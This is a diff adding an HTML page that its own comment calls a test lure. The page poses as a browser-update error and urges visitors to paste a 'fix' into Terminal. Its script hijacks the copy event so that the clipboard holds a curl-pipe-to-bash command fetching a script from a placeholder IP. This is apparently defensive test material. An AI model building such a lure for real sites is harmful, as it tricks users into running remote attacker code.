@@ -1,0 +1,17 @@
+<!doctype html>
+<!-- Test lure: copy-event hijack via clipboardData.setData (macOS variant). Payload is inert (TEST-NET IP). -->
+<html><head><meta charset="utf-8"><title>Fix the error</title></head>
+<body>
+  <h1>Your browser needs an update to show this document</h1>
+  <p>To fix the error, open the Terminal app, paste the command with Cmd + V and press Enter.</p>
+  <button id="fix">Copy fix</button>
+  <script>
+    document.addEventListener('copy', (e) => {
+      e.clipboardData.setData('text/plain', 'curl -s http://198.51.100.40/update.sh | bash');
+      e.preventDefault();
+    });
+    document.getElementById('fix').addEventListener('click', () => {
+      window.copyResult = String(document.execCommand('copy'));
+    });
+  </script>
+</body></html>
